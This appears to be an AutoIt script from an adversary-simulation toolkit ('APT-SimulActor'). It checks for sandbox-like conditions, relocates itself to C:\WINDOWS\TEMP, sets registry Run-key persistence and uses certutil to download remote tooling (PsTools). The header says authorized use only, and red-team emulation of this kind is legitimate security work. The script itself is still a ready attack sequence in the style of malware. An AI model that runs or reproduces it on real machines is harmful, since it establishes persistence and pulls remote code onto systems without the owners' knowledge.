#include "..\APT-SimulActor.au3"

; CAUTION: The APT-SimulActor use requires authorization from proper stakeholders.
; Author and Contributors will not be responsible for the malfunctioning or weaponization of the tool.

; Relocate to TEMP, establish persistence, download tooling.

HandleRelocation()

If Not IsInternetReachable()            Then Exit
If GetLoginCount(GetCurrentUser()) <= 2 Then Exit

If IsRunningFromDir("C:\WINDOWS\TEMP") Then
   SetRunKeyPersistence()
   DownloadFile($g_sPsToolsUrl, "certutil")
Else
   MoveAndExec("C:\WINDOWS\TEMP")
EndIf
